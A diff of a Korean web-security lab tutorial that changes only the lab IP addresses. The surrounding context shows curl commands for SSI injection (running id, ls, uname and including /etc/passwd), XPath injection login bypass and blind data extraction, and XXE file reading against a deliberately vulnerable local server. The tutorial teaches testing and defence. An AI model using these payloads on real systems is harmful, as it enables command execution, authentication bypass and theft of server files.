@@ -35,7 +35,7 @@ mermaid: true
 > **공통 방어**: 화이트리스트 입력 검증 + 해당 파서에 맞는 이스케이프 + 위험 기능 비활성화.
 {: .prompt-tip }
 
-DVWA에는 이 항목들의 모듈이 없으므로, [04 SSRF](/posts/websec-04-ssrf/)·[07 IDOR](/posts/websec-07-idor/) 실습처럼 Ubuntu 서버(`192.168.0.30`)에 **작은 취약 페이지를 직접 만들어** 점검합니다.
+DVWA에는 이 항목들의 모듈이 없으므로, [04 SSRF](/posts/websec-04-ssrf/)·[07 IDOR](/posts/websec-07-idor/) 실습처럼 Ubuntu 서버(`192.168.56.30`)에 **작은 취약 페이지를 직접 만들어** 점검합니다.
 
 ---
 
@@ -43,8 +43,8 @@ DVWA에는 이 항목들의 모듈이 없으므로, [04 SSRF](/posts/websec-04-s
 
 | 구분 | 내용 |
 |---|---|
-| 공격자 | Kali Linux (192.168.0.10) — 브라우저, curl, Burp Suite |
-| 대상 | Ubuntu + Apache/PHP (192.168.0.30) |
+| 공격자 | Kali Linux (192.168.56.10) — 브라우저, curl, Burp Suite |
+| 대상 | Ubuntu + Apache/PHP (192.168.56.30) |
 | 접근 | Ubuntu 서버에 SSH 또는 직접 터미널 (파일 생성·Apache 설정용) |
 
 > 아래 실습 파일은 모두 **의도적으로 취약하게** 만든 것입니다. 실습이 끝나면 각 절 마지막의 **정리(cleanup)** 명령으로 반드시 삭제하세요.
@@ -117,7 +117,7 @@ EOF
 **1단계 — 정상 동작 확인 (Kali에서)**
 
 ```bash
-curl -G "http://192.168.0.30/ssi/greet.shtml" --data-urlencode "철수"
+curl -G "http://192.168.56.30/ssi/greet.shtml" --data-urlencode "철수"
 ```
 
 출력에 `안녕하세요, 철수님` 이 나오면 입력이 페이지에 반영되는 것입니다.
@@ -125,7 +125,7 @@ curl -G "http://192.168.0.30/ssi/greet.shtml" --data-urlencode "철수"
 **2단계 — 서버 변수 노출 (KISA Step 1)**
 
 ```bash
-curl -G "http://192.168.0.30/ssi/greet.shtml" --data-urlencode '<!--#echo var="DOCUMENT_ROOT" -->'
+curl -G "http://192.168.56.30/ssi/greet.shtml" --data-urlencode '<!--#echo var="DOCUMENT_ROOT" -->'
 ```
 
 예상 출력:
@@ -139,9 +139,9 @@ curl -G "http://192.168.0.30/ssi/greet.shtml" --data-urlencode '<!--#echo var="D
 **3단계 — OS 명령 실행 (KISA Step 2)**
 
 ```bash
-curl -G "http://192.168.0.30/ssi/greet.shtml" --data-urlencode '<!--#exec cmd="id" -->'
-curl -G "http://192.168.0.30/ssi/greet.shtml" --data-urlencode '<!--#exec cmd="ls -al" -->'
-curl -G "http://192.168.0.30/ssi/greet.shtml" --data-urlencode '<!--#include virtual="/etc/passwd" -->'
+curl -G "http://192.168.56.30/ssi/greet.shtml" --data-urlencode '<!--#exec cmd="id" -->'
+curl -G "http://192.168.56.30/ssi/greet.shtml" --data-urlencode '<!--#exec cmd="ls -al" -->'
+curl -G "http://192.168.56.30/ssi/greet.shtml" --data-urlencode '<!--#include virtual="/etc/passwd" -->'
 ```
 
 예상 출력(첫 명령):
@@ -155,7 +155,7 @@ curl -G "http://192.168.0.30/ssi/greet.shtml" --data-urlencode '<!--#include vir
 **4단계 — 요청 헤더로 SSI 삽입 (KISA Step 3, 헤더가 페이지에 반영되는 경우)**
 
 ```bash
-curl "http://192.168.0.30/ssi/greet.shtml" \
+curl "http://192.168.56.30/ssi/greet.shtml" \
   -H 'User-Agent: <!--#exec cmd="uname -a" -->'
 ```
 
@@ -234,7 +234,7 @@ EOF
 **1단계 — 정상 로그인 확인**
 
 ```bash
-curl -s -X POST http://192.168.0.30/xpath_login.php -d "user=alice&pass=alicepw"
+curl -s -X POST http://192.168.56.30/xpath_login.php -d "user=alice&pass=alicepw"
 # → 로그인 성공: user
 ```
 
@@ -242,9 +242,9 @@ curl -s -X POST http://192.168.0.30/xpath_login.php -d "user=alice&pass=alicepw"
 
 ```bash
 # 항상 참
-curl -s -X POST http://192.168.0.30/xpath_login.php --data-urlencode "user=' or 'a'='a" --data-urlencode "pass=' or 'a'='a"
+curl -s -X POST http://192.168.56.30/xpath_login.php --data-urlencode "user=' or 'a'='a" --data-urlencode "pass=' or 'a'='a"
 # 항상 거짓
-curl -s -X POST http://192.168.0.30/xpath_login.php --data-urlencode "user=' or 'a'='b" --data-urlencode "pass=x"
+curl -s -X POST http://192.168.56.30/xpath_login.php --data-urlencode "user=' or 'a'='b" --data-urlencode "pass=x"
 ```
 
 "항상 참" 입력에서 **비밀번호 없이 로그인 성공**, "항상 거짓"에서 실패가 나오면 취약입니다.
@@ -253,10 +253,10 @@ curl -s -X POST http://192.168.0.30/xpath_login.php --data-urlencode "user=' or 
 
 ```bash
 # 첫 사용자 uid 의 길이가 5인지 (참이면 성공)
-curl -s -X POST http://192.168.0.30/xpath_login.php \
+curl -s -X POST http://192.168.56.30/xpath_login.php \
   --data-urlencode "user=' or string-length((//user[1]/uid))=5 and '1'='1" --data-urlencode "pass=x"
 # 첫 글자가 'a' 인지
-curl -s -X POST http://192.168.0.30/xpath_login.php \
+curl -s -X POST http://192.168.56.30/xpath_login.php \
   --data-urlencode "user=' or substring((//user[1]/uid),1,1)='a' and '1'='1" --data-urlencode "pass=x"
 ```
 
@@ -316,7 +316,7 @@ EOF
 **1단계 — 정상 XML 전송 확인**
 
 ```bash
-curl -s http://192.168.0.30/xxe_parse.php \
+curl -s http://192.168.56.30/xxe_parse.php \
   -H "Content-Type: application/xml" \
   --data-binary '<?xml version="1.0"?><foo>hello</foo>'
 # → 받은 값: hello
@@ -325,7 +325,7 @@ curl -s http://192.168.0.30/xxe_parse.php \
 **2단계 — 외부 엔티티로 서버 파일 읽기**
 
 ```bash
-curl -s http://192.168.0.30/xxe_parse.php -H "Content-Type: application/xml" --data-binary @- <<'EOF'
+curl -s http://192.168.56.30/xxe_parse.php -H "Content-Type: application/xml" --data-binary @- <<'EOF'
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
   <!ELEMENT foo ANY >
@@ -415,5 +415,5 @@ flowchart TD
 - KISA, 「주요정보통신기반시설 기술적 취약점 분석·평가 방법 상세가이드」 — Web Application(웹) > 코드 인젝션
 - OWASP — Server-Side Includes / XPath Injection / XXE Cheat Sheets — <https://cheatsheetseries.owasp.org/>
 
-> **⚠ 합법성**: 모든 실습은 본인 소유의 격리된 랩(`192.168.0.30`)에서만 수행하고, 실습 후 생성한 파일·설정을 반드시 제거합니다. 타인 시스템 대상 점검은 정보통신망법 위반입니다.
+> **⚠ 합법성**: 모든 실습은 본인 소유의 격리된 랩(`192.168.56.30`)에서만 수행하고, 실습 후 생성한 파일·설정을 반드시 제거합니다. 타인 시스템 대상 점검은 정보통신망법 위반입니다.
 {: .prompt-danger }
